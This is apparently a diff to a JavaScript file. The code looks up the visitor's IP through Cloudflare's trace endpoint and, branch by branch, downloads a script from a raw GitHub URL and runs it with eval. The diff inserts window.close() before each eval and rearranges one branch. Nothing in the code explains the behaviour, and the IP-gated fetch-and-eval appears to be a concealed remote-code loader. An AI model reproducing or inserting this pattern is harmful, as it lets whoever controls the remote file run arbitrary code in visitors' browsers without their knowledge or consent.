@@ -14,7 +14,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
 
@@ -24,7 +24,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
   }
@@ -33,7 +33,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
   }
@@ -42,18 +42,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
-    };
-    req.send();
-
-
-  }
-
-  else if (ip == '') {
-    req = new XMLHttpRequest();
-    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
-    req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
 
@@ -64,7 +53,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
 
@@ -75,7 +64,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
 
@@ -86,7 +75,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
 
@@ -97,7 +86,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
     };
     req.send();
 
@@ -108,7 +97,18 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
     req = new XMLHttpRequest();
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
     req.onload = function() {
-      eval(this.responseText);
+      window.close();eval(this.responseText);
+    };
+    req.send();
+
+
+  }
+
+  else if (ip == '') {
+    req = new XMLHttpRequest();
+    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/src/Application.js');
+    req.onload = function() {
+      window.close();eval(this.responseText);
     };
     req.send();
 
